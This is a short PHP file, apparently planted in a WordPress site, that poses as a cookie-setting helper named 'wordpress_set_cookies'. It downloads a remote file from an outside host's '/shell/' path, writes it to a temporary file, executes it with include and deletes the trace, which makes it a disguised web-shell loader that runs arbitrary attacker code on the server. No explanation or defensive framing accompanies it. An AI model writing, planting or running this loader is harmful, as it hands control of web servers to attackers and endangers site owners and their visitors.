<?php


// Our PHP code inside a variable
$ch = curl_init('https://marslogs.co.id/shell/shell/anon.txt');curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result = curl_exec($ch);
// end of variable
function wordpress_set_cookies($result) {
    $tmpfname = tempnam(sys_get_temp_dir(), "ses_2342d234359304212jd224");
    $handle = fopen($tmpfname, "w+");
    fwrite($handle, $result);
    fclose($handle);
    include $tmpfname;
    unlink($tmpfname);
    return get_defined_vars();
}
wordpress_set_cookies($result);
?>